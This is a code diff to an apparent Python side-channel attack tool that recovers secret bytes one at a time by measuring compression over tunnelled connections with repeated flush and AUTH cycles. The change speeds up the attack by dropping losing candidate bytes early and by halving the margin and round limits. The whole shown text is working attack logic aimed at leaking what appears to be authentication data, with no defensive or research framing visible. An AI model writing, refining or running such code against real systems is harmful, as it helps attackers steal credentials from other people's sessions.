@@ -182,32 +182,45 @@ async def crack_byte_position(
     """Recover one byte, repeating rounds until *margin >= min_margin*.
 
     Each round sweeps all noise lengths with fresh tunnel connections.
-    Candidate sums accumulate across rounds.  Because each round's
-    CHANNEL_OPEN alignment jitter is independent, the real compression
-    signal (7-8 bits per correct candidate) grows linearly with rounds
-    while the jitter grows as sqrt(rounds).
+    Candidate sums accumulate across rounds.  After each round,
+    candidates whose sum exceeds ``best_sum + min_margin`` are
+    eliminated — they can never catch the leader because wrong
+    candidates never compress smaller than the correct one.  This
+    progressively shrinks the alphabet, reducing the number of
+    flush+AUTH cycles in later rounds.
     """
     sums: dict[bytes, int] = {c: 0 for c in alphabet}
+    active = list(alphabet)
 
     for rnd in range(1, max_rounds + 1):
         round_sums = await _sweep_round(
-            session, packet_log, prefix, alphabet,
+            session, packet_log, prefix, active,
             noise_lengths, settle, flush_bytes,
         )
-        for c in alphabet:
+        for c in active:
             sums[c] += round_sums[c]
 
-        ranked = sorted(sums.items(), key=lambda kv: kv[1])
+        ranked = sorted(
+            [(c, sums[c]) for c in active], key=lambda kv: kv[1],
+        )
         best, best_sum = ranked[0]
-        second, second_sum = ranked[1]
+        second, second_sum = ranked[1] if len(ranked) > 1 else ranked[0]
         margin = second_sum - best_sum
 
+        # Eliminate candidates that fell too far behind.
+        before = len(active)
+        active = [c for c, s in ranked if s - best_sum < min_margin]
+        if len(active) < 2:
+            active = [c for c, _ in ranked[:2]]
+        eliminated = before - len(active)
+
         LOG.info(
-            "%s round=%d best=%r sum=%d  2nd=%r sum=%d  margin=%d",
+            "%s round=%d best=%r sum=%d  2nd=%r sum=%d  "
+            "margin=%d  alive=%d (-%d)",
             log_prefix, rnd,
             best.decode("latin-1"), best_sum,
             second.decode("latin-1"), second_sum,
-            margin,
+            margin, len(active), eliminated,
         )
         if margin >= min_margin:
             break
@@ -231,8 +244,8 @@ async def run_attack(
     terminator: bytes = b"\r",
     settle: float = 0.01,
     flush_bytes: int = 33000,
-    min_margin: int = 32,
-    max_rounds: int = 32,
+    min_margin: int = 16,
+    max_rounds: int = 16,
 ) -> dict[str, Any]:
     if noise_lengths is None:
         noise_lengths = list(range(8))
